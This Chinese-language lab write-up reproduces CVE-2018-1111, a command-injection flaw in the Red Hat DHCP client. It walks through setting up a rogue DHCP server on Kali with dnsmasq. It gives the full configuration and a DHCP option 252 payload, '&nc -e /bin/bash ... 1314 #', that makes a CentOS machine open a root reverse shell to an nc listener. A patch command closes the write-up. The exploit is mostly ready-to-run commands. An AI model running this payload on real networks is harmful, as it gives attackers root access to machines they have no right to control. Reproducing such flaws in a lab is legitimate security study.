# 概述
CVE-2018-1111，远程代码执行漏洞。<br>
攻击者可以通过伪造DHCP服务器发送响应包，攻击红帽系统，获取root权限并执行任意命令。

# 复现
## 环境
kali x64 <br>
centos 7 <br>
vmware14 <br>

## 设置网络
断开kali和centos的网络,将kali和centos都设置成主机模式，并且关闭主机的dhcp功能 <br>
![image](https://raw.githubusercontent.com/zhonghaoling/cve_sec/master/CVE-2018-1111/photos/setting%20network.jpg)


## 对kali做配置
先对自己ip进行配置，添加路由 <br>
```
ifconfig eth0 192.168.131.52 netmask 255.255.255.0
route add default gw 192.168.131.52
````

利用nc监听1314端口（毕竟520，端口都得选个好的）
```
nc -l -p 1314 -v
```
创建一个文件dnsmasq.conf，内容如下: <br>
```
bind-interfaces
interface=eth0
except-interface=lo
dhcp-range=192.168.131.10,192.168.131.30,22h
dhcp-option=3,192.168.131.52
dhcp-option=6,192.168.131.52
log-queries
log-facility=/var/log/dnsmasq.log
```

利用dnsmasq伪造dns服务器<br>
```
dnsmasq -dC dnsmasq.conf --dhcp-option="252,'&nc -e /bin/bash 192.168.131.52 1314 #"
```
![image](https://raw.githubusercontent.com/zhonghaoling/cve_sec/master/CVE-2018-1111/photos/photo2.jpg) <br>
![image](https://raw.githubusercontent.com/zhonghaoling/cve_sec/master/CVE-2018-1111/photos/photo3.jpg) <br>


## 攻击
centos连接网络，发现是由kali分配的ip地址 <br>
![image](https://raw.githubusercontent.com/zhonghaoling/cve_sec/master/CVE-2018-1111/photos/photo4.jpg) <br>

此时在kali的nc可以拿到centos的shell，且为root权限 <br>
![image](https://raw.githubusercontent.com/zhonghaoling/cve_sec/master/CVE-2018-1111/photos/photo5.jpg) <br>

## 范围
本地测试fedora28、centos7通过 <br>

## 修复方法
```
yum update dhclient
```


[原文链接: 逍遥自在 ChaMd5安全团队](https://mp.weixin.qq.com/s/UEMdmuRxPiHKDfTxnc501A)



